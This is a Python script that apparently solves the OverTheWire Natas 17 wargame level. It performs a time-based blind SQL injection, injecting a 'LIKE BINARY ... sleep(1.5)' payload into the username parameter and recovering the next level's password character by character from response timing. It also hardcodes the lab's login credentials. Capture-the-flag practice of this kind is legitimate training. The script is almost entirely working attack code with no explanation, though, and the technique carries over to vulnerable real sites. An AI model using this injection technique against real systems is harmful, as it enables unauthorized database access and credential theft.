import requests
from requests.auth import HTTPBasicAuth
import string

chars = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
nodone = True
while nodone:
    nodone = False
    for i in string.ascii_lowercase+string.ascii_uppercase+string.digits:
        checking = chars + i
        # print (checking)
        res = requests.get("http://natas17.natas.labs.overthewire.org/?debug=true&username=natas18\" and password LIKE BINARY \"{0}%\" and sleep(1.5) or \"".format(checking), auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        # print (res.elapsed.total_seconds())
        if (res.elapsed.total_seconds() > 1.5):
            chars += i
            print ("So far: " + chars)
            nodone = True
            break
 
print ("Final: " + chars)
        